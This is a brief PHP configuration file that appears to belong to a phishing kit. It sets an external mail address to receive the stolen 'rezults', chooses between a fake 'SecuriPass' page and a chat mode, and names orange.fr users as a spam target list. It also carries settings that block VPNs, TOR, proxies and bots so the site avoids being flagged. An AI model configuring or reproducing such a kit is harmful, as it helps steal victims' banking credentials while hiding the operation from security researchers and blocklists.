<?php

$Mail="asmitamirande@yandex.com";  // Mail for rezults

$option=0;  // set 0 for classic SecuriPass , 1 for chat option

$channel ="" ; // Chat channel Ex: https://tawk.to/chat/{Channel}

$emailList = 'orange.fr';  // show default list for spam , empty to disable this option



$API_IQS ='' ; /// API IP QUALITY SCORE https://www.ipqualityscore.com/ when u enable security to prevent red site .

$security=false;  //  true or false   // Enable to active security block VPN , TOR , Proxy , Bad IP and bot 




?>